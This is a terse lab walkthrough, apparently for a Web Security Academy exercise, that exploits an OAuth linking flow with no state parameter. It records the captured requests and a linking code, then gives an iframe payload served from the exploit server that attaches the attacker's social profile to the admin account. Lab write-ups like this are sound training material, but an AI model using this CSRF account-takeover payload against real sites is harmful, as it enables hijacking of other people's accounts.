/*

POST /login HTTP/2
csrf=tKU42gyNsOH9bWjfTyLLtmj21VLlZQjR&username=wiener&password=peter

GET /my-account?id=wiener HTTP/2

Your username is: wiener

Your email is: wiener@hotdog.com
Your API Key is: h57x894wuB8Wt9BoJvVhJtRleCQw8wtb

a) GET /auth?client_id=jy6hufuvxax7pbg0syiff&redirect_uri=https://LAB-ID.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1

GET /interaction/lMrQMRW49_-i8SN8Djg7B HTTP/2
Cookie: _interaction=lMrQMRW49_-i8SN8Djg7B

POST /interaction/lMrQMRW49_-i8SN8Djg7B/login HTTP/2
username=wiener&password=peter

GET /oauth-linking?code=vSuvERBz1YqkyOcYUQqMX-5px7Trvf-M7Qqg28un_vt HTTP/2
copy this UR code and drop the request
https://0a8000e003d2435384c40f49006b00d9.web-security-academy.net/oauth-linking?code=8tqX-w1IEhbwRXFhSWtKkiWEcIra4PHKxvq2rQA8aNZ

log out 

2) deliver this from exploit server
<iframe src="https://0a8000e003d2435384c40f49006b00d9.web-security-academy.net/oauth-linking?code=8tqX-w1IEhbwRXFhSWtKkiWEcIra4PHKxvq2rQA8aNZ">
</iframe>

the next time you click login with social media profile,
the iframe will be loaded in context of the admin session.
as it will complete the OAuth flow using your social media profile, 
attaching it to the admin account on the blog website
this is because of the absence of STATE component in the OAuth flow
*/